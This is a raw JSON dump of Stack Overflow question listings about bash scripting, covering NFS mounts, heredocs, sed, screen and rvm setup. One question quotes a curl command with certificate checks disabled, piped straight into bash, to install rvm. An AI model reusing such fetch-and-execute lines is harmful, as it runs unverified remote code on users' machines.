line.</p>\n"},{"tags":["linux","bash","unix","shell","nfs"],"answer_count":3,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":3459,"score":4,"question_id":1643347,"title":"Is there a good way to detect a stale NFS mount","body":"<p>I have a procedure I want to initiate only if several tests complete successfully.</p>\n\n<p>One test I need is that all of my NFS mounts are alive and well.</p>\n\n<p>Can I do better than the brute force approach:</p>\n\n<p><hr /></p>\n\n<pre><code>mount | sed -n \"s/^.* on \\(.*\\) type nfs .*$/\\1/p\" | \nwhile read mount_point ; do \n  timeout 10 ls $mount_point &gt;&amp; /dev/null || echo \"stale $mount_point\" ; \ndone\n</code></pre>\n\n<p>Here <code>timeout</code> is a utility that will run the command in the background, and will kill it after a given time, if no <code>SIGCHLD</code> was caught prior to the time limit, returning success/fail in the obvious way.</p>\n\n<p><hr /></p>\n\n<p>In English: Parse the output of <code>mount</code>, check (bounded by a timeout) every NFS mount point. Optionally (not in the code above) breaking on the first stale mount.</p>\n"},{"tags":["php","javascript","html","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":80,"score":4,"question_id":12910112,"title":"Executing a bash script using php exec and javascript","body":"<p>I am trying to run this javascript below but am not seeing the output of the php shell_exec command.</p>\n\n<p>Running the test -a bash script will output a series of ID's 34535, 25643, 23262, and so on. When I run it in my php file with a simple it works fine.</p>\n\n<pre><code>print shell_exec('/opt/bin/echkchunk -a');\n</code></pre>\n\n<p>But when I try to run it below and I select test1 there is nothing outputted to the screen. Looking through chromes developer tools I see the code when test1 is selected as the following </p>\n\n<p><code>&lt;!--?php shell_exec(\"/opt/bin/echkchunk -a\"); ?--&gt;</code> </p>\n\n<p>as if it is commented out. </p>\n\n<p>So my question is, is it possible to run the bash script this way with php and JavaScript? Or is there another way to get that information displayed to the webpage without JavaScript?</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n  var tester = '&lt;?php shell_exec(\"/opt/bin/test -a\"); ?&gt;';      \n     $(document).ready(function() {\n            $(\"#selector\").on(\"change\", function() {\n                    if ($(\"#selector\").val() == \"test1\") {\n                        $(\"#rightselection\").css(\"background-color\", \"red\");\n                        $(\"#rightselection\").html(tester);\n                    }\n                    if ($(\"#selector\").val() == \"test2\") {\n                        $(\"#rightselection\").css(\"background-color\", \"blue\");\n                        $(\"#rightselection\").html(\"test2\");\n                    }\n                    if ($(\"#selector\").val() == \"test3\"){\n                        $(\"#rightselection\").css(\"background-color\", \"yellow\");\n                        $(\"#rightselection\").html(\"test3\");\n                    }\n                    if ($(\"#selector\").val() == \"\"){\n                        $(\"#rightselection\").css(\"background-color\", \"green\");\n                        $(\"#rightselection\").html(\"This is a Test\");\n                    }\n            });\n    });\n&lt;/script&gt;\n</code></pre>\n"},{"tags":["bash","formatting"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12900876,"title":"Is there any fomatting tool for Bash shell scripts?","body":"<p>I'm looking for an indentation tool for Bash shell scripts similar to <code>indent</code> for the C language, which can deal with indentation and also with other issues such as parentheses matching, blank space in the condition expression and so on.</p>\n\n<p>Thanks!</p>\n"},{"tags":["mysql","bash","shell","unix","ssh"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":101,"score":1,"question_id":12905077,"title":"Create mySQL database through ssh in a bash script","body":"<p>I want to create a database on a remote server through ssh with a bash script. Something like this</p>\n\n<pre><code>#!/bin/sh\nssh user@example.com 'mysql -h example.com -uroot -pMYPASSWD -e \"CREATE DATABASE $1;\"'\n</code></pre>\n\n<p>So that I in terminal can run it like</p>\n\n<pre><code>$ myBashScript nameOfNewDatabase\n</code></pre>\n"},{"tags":["bash","eof","heredoc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12503581,"title":"Bash: warning: here-document at line delimited by end-of-file (wanted `EOF')","body":"<p>The following function in bash comes up with the error mentioned  in the title. The error usually appears when the final 'EOF' is not at the beginning of the line. </p>\n\n<p>EOF is at the beginning so I can't see what is wrong. Further up in the script (not shown) there are other here-docs and they work.</p>\n\n<pre><code>add_testuser()\n{\n    kadmin -p admin -q addprinc test\n    cat &lt;&lt;EOF &gt; ~/test.ldif\ndn: cn=test,ou=groups,dc=${ARRAY[1]},dc=${ARRAY[2]}\ncn: test\ngidNumber: 20001\nobjectClass: top\nobjectClass: posixGroup\n\ndn: uid=test,ou=people,dc=${ARRAY[1]},dc=${ARRAY[2]}\nuid: test\nuidNumber: 20001\ngidNumber: 20001\ncn: First_name\nsn: Last_name\nobjectClass: top\nobjectClass: person\nobjectClass: posixAccount\nobjectClass: shadowAccount\nloginShell: /bin/bash\nhomeDirectory: /home/test\nuserPassword: {CRYPT}*\nEOF \n\n    ldapadd -Qf ~/test.ldif\n    kdestroy; kinit test\n    klist\n    ldapwhoami\n}\n</code></pre>\n"}]}
{"total":16352,"page":10,"pagesize":100,"questions":[{"tags":["python","bash","imgur"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12903938,"title":"Downloading file from imgur using python directly via url.","body":"<p>Sometime, links to imgur are not given with the file extension. For examlpe: <a href=\"http://imgur.com/rqCqA\" rel=\"nofollow\">http://imgur.com/rqCqA</a> . I want to download the file and give it a known name or get it name inside a larger code. The problem is that I don't know the file type, so I don't know what extension to give it. </p>\n\n<p>How can I achieve this in python or bash?</p>\n"},{"tags":["linux","bash","shell","unix"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":113,"score":1,"question_id":12902371,"title":"Execute Shell script after other script got executed successfully","body":"<p><strong>Problem Statement:-</strong></p>\n\n<p>I have four shell script that I want to execute only when the previous script got executed successfully. And I am running it like this currently-</p>\n\n<pre><code>./verify-export-realtime.sh\n\nsh -x lca_query.sh\n\nsh -x liv_query.sh\n\nsh -x lqu_query.sh\n</code></pre>\n\n<p>So In order to make other scripts run after previous script was successful. I need to do something like below? I am not sure whether I am right? If any script got failed due to any reason it will print as <strong>Failed due to some reason</strong>  right?</p>\n\n<pre><code>./verify-export-realtime.sh\n\nRET_VAL_STATUS=$?\necho $RET_VAL_STATUS\nif [ $RET_VAL_STATUS -ne 0 ]; then\necho \"Failed due to some reason\"\nexit\nfi\n\nsh -x lca_query.sh\n\nRET_VAL_STATUS=$?\necho $RET_VAL_STATUS\nif [ $RET_VAL_STATUS -ne 0 ]; then\necho \"Failed due to some reason\"\nexit\nfi\n\nsh -x liv_query.sh\n\nRET_VAL_STATUS=$?\necho $RET_VAL_STATUS\nif [ $RET_VAL_STATUS -ne 0 ]; then\necho \"Failed due to some reason\"\nexit\nfi\n\n\nsh -x lqu_query.sh\n</code></pre>\n"},{"tags":["bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12907721,"title":"Run three shell script simultaneously","body":"<p>I have three shell script which I am running as below-</p>\n\n<pre><code>sh -x script1.sh\n\nsh -x script2.sh\n\nsh -x script3.sh\n</code></pre>\n\n<p>So each script is executed sequentially one at a time after previous one finished executing.</p>\n\n<p><strong>Problem Statement:-</strong></p>\n\n<p>Is there any way I can execute all the three above scripts at same time from a single window?\nI just want to execute script1, script2, script3 at the same time. If you think of some CRON JOB scheduling <code>script1 at 3 AM, script2 at 3AM, script3 at 3AM</code> (all three scripts at the same time, simultaneously). That's what I need, I need to execute all the three scripts simultaneously.</p>\n"},{"tags":["bash","gnu-screen"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12907230,"title":"Bash: Killing all screens with a specified name","body":"<p>If I have multiple screens with the same name, how could I kill all of them without checking all of their PIDs, and then executing <code>screen -wipe</code>?</p>\n\n<p>Example:</p>\n\n<pre><code>24754.screen1  (Detached)\n32236.screen1  (Detached)\n7308.screen1   (Detached)\n3896.screen1   (Detached)\n10155.screen1  (Detached)\n10888.screen1  (Detached)\n28438.screen1  (Detached)\n26008.screen1  (Detached)\n</code></pre>\n\n<p>I would like to kill all instances of screen1, terminate any processes running within, and not need to run <code>screen -wipe</code> after.</p>\n"},{"tags":["linux","bash","sorting","csv","uniq"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":146,"score":2,"question_id":12888748,"title":"remove dups from many csv files","body":"<p>Given n csv files where they add up to 100 GB in size, I need to remove duplicate rows based on the following rules and conditions:</p>\n\n<ul>\n<li>The csv files are numbered 1.csv to n.csv, and each file is about 50MB in size.</li>\n<li>The first column is a string key, 2 rows are considered dup if their first columns are the same.</li>\n<li>I want to remove dups by keeping the one in a later file (2.csv is considered later than 1.csv)</li>\n</ul>\n\n<p>My algorithm is the following, I want to know if there's a better one.</p>\n\n<ul>\n<li><p>merge all files into one giant file</p>\n\n<pre><code>cat *.csv &gt; one.csv\n</code></pre></li>\n<li><p>sort the csv</p>\n\n<pre><code>sort one.csv &gt;one_sorted.csv\n</code></pre></li>\n<li><p>not sure how to elimiate dups at this point. <code>uniq</code> has a -f flag that skips the first N fields, but in my case I want to skip all but the first 1 fields.</p></li>\n</ul>\n\n<p>I need help with the last step (eliminating dups in a sorted file).  Also is there a more efficient algorithm?</p>\n"},{"tags":["bash","scripting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12898998,"title":"bash: passing entire command (with arguments) to a function","body":"<p>I am essentially trying to implement a function which asserts the failure (non-zero exit code) of another command, and prints a message when it fails. </p>\n\n<p>Here is my function:</p>\n\n<pre><code>function assert_fail () {\n    COMMAND=$@\n    if [ `$COMMAND; echo $?` -ne 0 ]; then \n        echo \"$COMMAND failed as expected.\"\n    else\n        echo \"$COMMAND didn't fail\"\n    fi\n}\n\n# This works as expected\nassert_fail rm nonexistent\n\n# This works too\nassert_fail rm nonexistent nonexistent2\n\n# This one doesn't work\nassert_fail rm -f nonexixtent\n</code></pre>\n\n<p>As soon as I add options to the command, it doesn't work. Here is the output of the above:</p>\n\n<pre><code>rm: cannot remove `nonexistent': No such file or directory\nrm nonexistent failed as expected.\nrm: cannot remove `nonexistent': No such file or directory\nrm: cannot remove `nonexistent2': No such file or directory\nrm nonexistent nonexistent2 failed as expected.\nrm -f nonexistent didn't fail\n</code></pre>\n\n<p>I have tried putting double quotes around the commands, to no avail. I would expect the third invocation in the above to produce similar output to the other two.</p>\n\n<p>I appreciate any/all help!</p>\n"},{"tags":["bash","gnu-screen"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12906446,"title":"Bash: Screen parameters being interpreted incorrectly","body":"<p>I'm trying to start daemon screens with <code>screen -dmS nameofscreen command</code>. This works by itself, but when I use a command with <code>&amp;&amp;</code> or <code>|</code> it seems to interpret it wrong.</p>\n\n<p>Example: <code>screen -dmS screen1 echo test &amp;&amp; ls -al</code></p>\n\n<p>It seems to be interpreted as <code>(screen -dmS screen1 echo test) &amp;&amp; (ls -al)</code> and I'm looking for it to be interpreted as <code>screen -dmS screen1 (echo test &amp;&amp; ls -al)</code>.</p>\n\n<p>How is this done? If I use () around the commands to be passed, screen doesn't accept it?</p>\n"},{"tags":["regex","bash","match"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":92,"score":0,"question_id":12883582,"title":"regex to find number preceded and followed by different strings","body":"<p>I have a text file containing text and numbers, for example:</p>\n\n  \n\n<pre class=\"lang-none prettyprint-override\"><code>MANGO444CHERRYa.b /c-1@2#3APPLEa&gt;b;c. a1$2$3WHITE12 3ab cWHITE5%6^7a=b +cWHITEaba5b6a7baMANGO555CHERRY 1'2'3a,b,c!APPPLE1`2~3ab @cYELLOW123---a- -bcYELLOW\n</code></pre>\n\n<p>I need to get he number between <code>MANGO</code> and <code>CHERRY</code> that comes before <code>APPLE</code> and <code>WHITE</code>  (in this case, <code>444</code>).  The text between the uppercase words can be anything at all.  I tried this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>(?&lt;=MANGO)\\d+((=?.*?APPLE)(=?.*?WHITE))  \n</code></pre>\n\n<p>but it returns:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>444CHERRYa.b /c-1@2#3APPLEB&gt;b;c. a1$2$3WHITE\n</code></pre>\n\n<p>I hope this demonstrates the problem in a better way</p>\n"},{"tags":["mysql","database","bash","script"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":12609663,"title":"Creating a MySQL Database Using a Variable in a BASH Script","body":"<p>I'm trying to create a MySQL database using a variable in a BASH script. Here is the code giving me trouble:  <strong>database=\"mysql --verbose --user=root --password --execute=\"create database foo\"\"</strong> When run it fails with an option listing. I'm sure the issue is with the use of quotes after the execute option but I can't figure out how to get it to work.</p>\n"},{"tags":["git","bash","autocomplete"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12905206,"title":"Custom bash autocomplete for git breaks git-autocomplete.bash","body":"<p>I am trying to add autocompletion to <code>git commit</code> upon hitting <kbd>Tab</kbd><kbd>Tab</kbd>. </p>\n\n<p>The autocomplete feature I am working on is based on a branch-naming convention. The convention is to append the PivotalTracker Id number to the end of the branch name, so a typical branch would look like <code>foo-bar-baz-1449242</code>.</p>\n\n<p>We can associate the commits with the PivotalTracker card by prepending <code>[#1449242]</code> to the beginning of the commit message. I would like this to be auto-inserted if <code>git commit</code> is typed in and the user hits <kbd>Tab</kbd><kbd>Tab</kbd>.</p>\n\n<p>I have already done this here: <a href=\"https://github.com/tlehman/dotfiles/blob/master/ptid_git_complete\" rel=\"nofollow\">https://github.com/tlehman/dotfiles/blob/master/ptid_git_complete</a></p>\n\n<p>(and for convenience, here is the source code):</p>\n\n<pre><code>  function _ptid_git_complete_()\n  {\n    local line=\"${COMP_LINE}\"                   # the entire line that is being completed\n\n    # check that the commit option was passed to git \n    if [[ \"$line\" == \"git commit\" ]]; then \n      # get the PivotalTracker Id from the branch name\n      ptid=`git branch | grep -e \"^\\*\" | sed 's/^\\* //g' | sed 's/\\-/ /g' | awk '{ print $(NF) }'`\n      nodigits=$(echo $ptid | sed 's/[[:digit:]]//g')\n\n      if [ ! -z $nodigits ]; then\n        : # do nothing\n      else\n        COMPREPLY=(\"commit -m \\\"[#$ptid]\")\n      fi\n    else\n      reply=()\n    fi\n  }\n\n  complete -F _ptid_git_complete_ git\n</code></pre>\n\n<p>The problem is that this breaks the git autocompletion features defined in <a href=\"https://github.com/git/git/blob/master/contrib/completion/git-completion.bash\" rel=\"nofollow\">git-autocompletion.bash</a></p>\n\n<p>How can I make this function compatible with git-autocompletion.bash?</p>\n"},{"tags":["linux","bash","shell","scripting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":93,"score":-2,"question_id":12902353,"title":"bash, if then script to parse file","body":"<p>My requirements is to look through a F-5 config. </p>\n\n<p>Something like: </p>\n\n<pre><code> If x=virtual\n grep for virtual | pool | destination\n</code></pre>\n\n<p>File looks like this: </p>\n\n<pre><code>virtual vs_website_443 {\nsnat automap\npool pl_website_443\ndestination 11.11.11.11:https\nip protocol tcp\npersist pr_cookie_JSESSION_AP\nprofiles {\n   oneconnect-ebiz-blah {}\n  pr_http_ebiz_x_forwarded_for {}\n   serverssl {\n      serverside\n  }\n   tcp-lan-optimized {}\n   wildcard.origin.website.com {\n      clientside\n   }\n}\n</code></pre>\n"},{"tags":["wordpress","bash","unix","vim"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12900921,"title":"Find Wordpress hooks and filters using Vim or similar","body":"<p>Wordpress allows you to extend its core using \"hooks\" and \"filters.\" For example, to execute something quite early in the execution process I may write</p>\n\n<pre><code>add_action( 'init', function() { // Do something } );\n</code></pre>\n\n<p>Filters work similarly. The function that defines a hook is <code>do_action</code>, so to create the init hook a core developer wrote</p>\n\n<pre><code>do_action( 'init' );\n</code></pre>\n\n<p>do_action accepts several optional arguments that this hook doesn't demonstrate. The function names for filters are add_filter and apply_filter.</p>\n\n<p>Say I'm browsing the source code of some plugin and it's using a hook from one of the source files and I don't know which one. What is the easiest way to locate it?</p>\n\n<p>In Vim I use ctags a lot and I was hoping that it was possible to do something similar, only instead of giving the function name I could give the filter or hook name. Any ideas?</p>\n\n<p>(If it can't be done from within Vim, like ctags, second best would be to run a command that will locate the script for me. This could also be acceptable if it is the best solution)</p>\n"},{"tags":["ruby-on-rails-3","bash","rvm","command-prompt"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":69,"score":0,"question_id":12898205,"title":"Display in bash prompt","body":"<p>I am working with bash and still unfamiliar with the difference between <code>.profile</code>, <code>.bashrc</code>, <code>.bash_profile</code>.</p>\n\n<p>My desired result is to have the ruby version and <code>rvm gemset</code> show up on my bash prompt.</p>\n\n<p>I added <code>PS1=\"\\$(~/.rvm/bin/rvm-prompt) $PS1\"</code> to .bash_profile (via xcode) and it displays </p>\n\n<pre><code>ruby-1.9.3-p286 John-MacBook-Air:~ john$\n</code></pre>\n\n<p>What I trying to get is </p>\n\n<pre><code>ruby-1.9.3-p286@rails3 $\n</code></pre>\n\n<p>With \"rails3\" being the output of <code>rvm gemset</code>.</p>\n\n<p><strong>How do I get <code>John-MacBook-Air:~ john</code> removed from the prompt?</strong></p>\n\n<p>I tried adding the line in the .profile, and .bashrc with no luck but it seems to work in the .bash_profile.  Any clarification between these files would be greatly appreciated.  I am running rvm on a Mac.</p>\n\n<p><strong>SOLUTION</strong></p>\n\n<p>include the following to the .bash_profile</p>\n\n<pre><code>PS1='\\W \\$ '\nPS1=\"\\$(~/.rvm/bin/rvm-prompt) $PS1\"\n</code></pre>\n\n<p>the prompt looks like</p>\n\n<pre><code>ruby-1.9.3-p286@rails3 ~ $ \n</code></pre>\n"},{"tags":["bash","rvm","osx-leopard"],"answer_count":4,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1911,"score":4,"question_id":10574969,"title":"How do I install Bash >= 3.2.25 on Mac OS X 10.5.8?","body":"<p>I'm following Michael Hartl's Rails tutorial, so far I've installed Git 1.7.5.4 x86_64 (I'm running OSX 10.5.8) and I'm trying to install rvm</p>\n\n<p>After I run the following: </p>\n\n<p><code>$ curl -kL get.rvm.io | bash -s stable</code></p>\n\n<p>I get:  </p>\n\n<pre><code>BASH 3.2.25 required (you have 3.2.17(1)-release)\n</code></pre>\n\n<p>I've tried changing the shell, using <code>chsh -s /opt/local/bin/bash</code> but I get <code>shell '/opt/local/bin/bash' does not exist</code></p>\n\n<p>Not sure where to go from here but I'd appreciate any guidance. Thanks!</p>\n"},{"tags":["bash","file","recursion"],"answer_count":8,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":3686,"score":6,"question_id":657108,"title":"Bash: Recursively adding subdirectories to the path","body":"<p>How do you do it? My code/ directory at work is organized in folders and subfolders and subsubfolders, all of which (at least in theory) contain scripts or programs I want to run on a regular basis. </p>\n\n<p>Its turning my otherwise picturesque .bashrc into an eyesore!</p>\n\n<p>Thanks!</p>\n"},{"tags":["linux","bash","shell","iptables","netstat"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12899056,"title":"Writing bash code for performance standards","body":"<p>Is there a better way to rewrite this code to get enhanced performance? </p>\n\n<p>If you were to get a bunch of IPs the system seems to hang.</p>\n\n<pre><code>TMP_PREFIX='/tmp/synd'\nTMP_FILE=\"mktemp $TMP_PREFIX.XXXXXXXX\"\nBANNED_IP_MAIL=`$TMP_FILE`\nBANNED_IP_LIST=`$TMP_FILE`\necho \"Banned the following ip addresses on `date`\" &gt; $BANNED_IP_MAIL\necho &gt;&gt; $BANNED_IP_MAIL\nBAD_IP_LIST=`$TMP_FILE`\nnetstat -ntu | grep SYN_RECV | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr &gt; $BAD_IP_LIST\ncat $BAD_IP_LIST\nif [ $KILL -eq 1 ]; then\n    IP_BAN_NOW=0\n    while read line; do\n        CURR_LINE_CONN=$(echo $line | cut -d\" \" -f1)\n        CURR_LINE_IP=$(echo $line | cut -d\" \" -f2)\n        if [ $CURR_LINE_CONN -lt $NO_OF_CONNECTIONS ]; then\n            break\n        fi\n        IGNORE_BAN=`grep -c $CURR_LINE_IP $IGNORE_IP_LIST`\n        if [ $IGNORE_BAN -ge 1 ]; then\n            continue\n        fi\n        IP_BAN_NOW=1\n        echo \"$CURR_LINE_IP with $CURR_LINE_CONN SYN_RECV connections\" &gt;&gt; $BANNED_IP_MAIL\n        echo $CURR_LINE_IP &gt;&gt; $BANNED_IP_LIST\n        echo $CURR_LINE_IP &gt;&gt; $IGNORE_IP_LIST\n        if [ $CSF_BAN -eq 1 ]; then\n            $CSF -d $CURR_LINE_IP\n        else\n            $IPT -I INPUT -s $CURR_LINE_IP -j DROP\n        fi\n    done &lt; $BAD_IP_LIST\n    if [ $IP_BAN_NOW -eq 1 ]; then\n        dt=`date`\n                hn=`hostname`\n        if [ $EMAIL_TO != \"\" ]; then\n            cat $BANNED_IP_MAIL | mail -s \"IP addresses banned on $dt $hn\" $EMAIL_TO\n        fi\n    fi\nfi\nrm -f $TMP_PREFIX.*\n</code></pre>\n"},{"tags":["bash","if-statement","else"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":114,"score":3,"question_id":12875977,"title":"BASH - If else, Regular expression, OR","body":"<p>My bash script is supposed to check if the user inputs two numbers. Each number should be preceded by either a <code>+</code> or a <code>-</code> sign. The first number should be four digits long, and the second number should be five digits long. </p>\n\n<p>No matter what values I enter, the output is always <code>Fail</code></p>\n\n<p>Command-line statement to run the script:</p>\n\n<pre><code>$me add +1234 -12345\n</code></pre>\n\n<p>The script:</p>\n\n<pre><code>#!/bin/bash\n#Script name add\nif [ $1 != [\\+\\-][0-9][0-9][0-9][0-9] ] || \n   [ $2 != [\\+\\-][0-9][0-9][0-9][0-9][0-9] ]\n  then\n    echo Fail\nelse    \n    echo Success\nfi\n</code></pre>\n"},{"tags":["bash","shell","testing","script","wildcard"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12873834,"title":"List directories not containing certain files?","body":"<p>I used this command to find all the directories containing .mp3 in the current directory, and filtered out only the directory names:</p>\n\n<pre><code>find . -iname \"*.mp3\" | sed -e 's!/[^/]*$!!' -e 's!^\\./!!' | sort -u\n</code></pre>\n\n<p>I now want the opposite, but I found it a little harder. I can't just add a '!' to the find command since it'll only exclude .mp3 when printing them not find directories that do not contain .mp3.</p>\n\n<p>I googled this and searched on stackoverflow and unix.stackexchange.com.\nI have tried this script so far and it returns this error:</p>\n\n<pre><code>#!/bin/bash\n\nfind . -type d | while read dir\ndo\nif [[! -f $dir/*.mp3 ]]\nthen\n    echo $dir\nfi\ndone\n</code></pre>\n\n<p>/home/user/bin/try.sh: line 5: [[!: command not found</p>\n\n<pre><code>#!/bin/bash\n\nfind . -type d | while read dir\ndo\nif [! -f $dir/*.mp3 ]\nthen\n    echo $dir\nfi\ndone\n</code></pre>\n\n<p>/home/user/bin/try.sh: line 5: [!: command not found</p>\n\n<pre><code>#!/bin/bash\n\nfind . -type d | while read dir\ndo\nif [[! -f \"$dir/*.mp3\" ]]\nthen\n    echo $dir\nfi\ndone\n</code></pre>\n\n<p>/home/user/bin/try.sh: line 5: [!: command not found</p>\n\n<p>I'm thinking it has to do with multiple arguments for the test command.</p>\n\n<p>Since I'm testing all the directories the variable is going to change, and I use a wildcard for the filenames.</p>\n\n<p>Any help is much appreciated.  Thank You.</p>\n"},{"tags":["bash","escaping","quotes","zsh"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12884902,"title":"Do zsh or bash have quotes that are convenient for English text?","body":"<p>If I use single quotes, words with apostrophes (\"don't\") are annoying to escape:</p>\n\n<pre><code>'Don'\"'\"'t do that'\n</code></pre>\n\n<p>If I use double quotes, dollar signs and exclamation points trip it up:</p>\n\n<pre><code>\"It cost like \\$1000\\!\"\n</code></pre>\n\n<p>Is there another kind of quoting I can use?</p>\n\n<p><strong>edit</strong>: I should also add that I would like to pass this string directly as a command line argument, rather than storing it in a variable. To this end I tried, using DigitalRoss's solution,</p>\n\n<pre><code>$ echo \"$(cat &lt;&lt; \\EOF \nDon't $worry be \"happy\".\nEOF)\"\n</code></pre>\n\n<p>but get</p>\n\n<pre><code>dquote cmdsubst&gt; \n</code></pre>\n\n<p>after hitting enter :/ . So at this point ZyX's suggestion of <code>setopt rcquotes</code> looks to be the most convenient.</p>\n"},{"tags":["bash","unix","scripting"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":38,"score":2,"question_id":12899841,"title":"Why does piping keep collapsing functions from keeping its new definition?","body":"<p>On Bash-Hackers.org there is a <a href=\"http://wiki.bash-hackers.org/howto/collapsing_functions\" rel=\"nofollow\">nice little wiki entry</a> on collapsing functions. Basically, a collapsing function is a function that redefines itself based on some condition. The basic example was something like the following:</p>\n\n<pre><code>chatter() {\n  if [[ $verbose ]]; then\n    chatter() {\n      echo \"$@\"\n    }\n    chatter \"$@\"\n  else\n    chatter() {\n      :\n    }\n  fi\n}\n</code></pre>\n\n<p>I thought that was a nice little trick that might be useful for creating functions like the following:</p>\n\n<pre><code># a portable extended regular expression sed for Linux and Mac\n# simply checks if using an option fails for one version\n# @see http://wiki.bash-hackers.org/howto/collapsing_functions\nmy_sed() {\n    if ( echo abc | sed -r /abd/p &gt; /dev/null 2&gt;/dev/null ) ; then \n        #we are running a GNU version. redefine function\n        echo gnu\n        my_sed() {\n            sed -r \"$@\"\n        }\n    else \n        #we are running another version. defaulting to BSD\n        #redefining function\n        echo osx\n        my_sed() {\n            sed -E \"$@\"\n        }\n    fi\n    my_sed \"$@\"\n}\n</code></pre>\n\n<p>(The echo statements are just for debugging btw). This works as intended when running it as <code>my_sed \"s/foo/bar\" /tmp/somefile.txt</code>, outputting \"gnu\" (on Linux, osx on Mac) the first time, then keeping silent for subsequent runs. But if I simply use the function in pipes, the function is not being redefined, constantly outputting \"gnu\". Example: <code>echo 123 | my_sed 's/foo/bar'</code> will output \"gnu\" every time it is being run in the shell.</p>\n\n<p>Why is this? What is piping doing with the current context/shell that keeps the function from keeping its new definition? Is piping forking a new process each time, so that the new definition is lost from the originating shell?</p>\n"},{"tags":["bash","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12856372,"title":"Check every line a process outputs and do an action if a condition is met","body":"<p>I'm not so good with bash syntax and bash itself.\nBasically, i want to check, in real time, while a process is creating output, if a certain line, with a certain content is printed, and if, do something.</p>\n\n<pre><code>    processName | while read myLine; if [ $myLine -eq \"Loading X module\" ]; then echo 'OMG' fi; done\n</code></pre>\n"},{"tags":["bash","sed","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":58,"score":2,"question_id":12898945,"title":"Using placeholders/variables in a sed command","body":"<p>I want to store a specific part of a matched result as a variable to be used for replacement later. I would like to keep this in a one liner instead of finding the variable I need before hand.</p>\n\n<p>when configuring apache, and use mod_rewrite, you can specificy specific parts of patterns to be used as variables,like this:</p>\n\n<pre><code>RewriteRule ^www.example.com/page/(.*)$ http://www.example.com/page.php?page=$1 [R=301,L]\n</code></pre>\n\n<p>the part of the pattern match that's contained inside the parenthesis is stored as $1 for use later. So if the url was <code>www.example.com/page/home</code>, it would be replaced with <code>www.example.com/page.php?page=home</code>. So the \"home\" part of the match was saved in $1 because it was the part of the pattern inside the parenthesis.</p>\n\n<p>I want something like this functionality with a <code>sed</code> command, I need to automatically replace many strings in a SQL dump file, to add drop table if exist commands before each create table, but I need to know the table name to do this, so if the dump file contains something like:</p>\n\n<pre><code>...\nCREATE TABLE `orders`\n...\n</code></pre>\n\n<p>I need to run something like:</p>\n\n<pre><code>cat dump.sql | sed \"s/CREATE TABLE `(.*)`/DROP TABLE IF EXISTS $1\\N CREATE TABLE `$1`/g\"\n</code></pre>\n\n<p>to get the result of:</p>\n\n<pre><code>...\nDROP TABLE IF EXISTS `orders`\nCREATE TABLE `orders`\n...\n</code></pre>\n\n<p>I'm using the mod_rewrite syntax in the <code>sed</code> command as a logical example of what I'm trying to do.</p>\n\n<p>Any suggestions?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":599,"score":1,"question_id":6046176,"title":"bash : adding a name value to a structure using bash","body":"<p>I want to do the  following in bash for example say i have the following names rather than creating three seperate arrays to hold the contents of LC1 , LC2 and LC3 i thought it might be best to create a tree structure in bash or maybe someone might have a neater solution - I need to do this in bash .</p>\n\n<pre><code> LC1\n    Test1\n    Test2\n LC2\n    Test3\n    Test4\n LC3\n    Test5\n    Test6\n</code></pre>\n"},{"tags":["bash","numeric","bc"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12882611,"title":"How to get bc to handle numbers in scientific (aka exponential) notation?","body":"<p><code>bc</code> doesn't like numbers expressed in scientific notation (aka exponential notation).</p>\n\n<pre><code>$ echo \"3.1e1*2\" | bc -l\n(standard_in) 1: parse error\n</code></pre>\n\n<p>but I need to use it to handle a few records that are expressed in this notation. Is there a way to set <code>bc</code> to understand exponential notation? If not, what can I do to translate them in a format that <code>bc</code> will 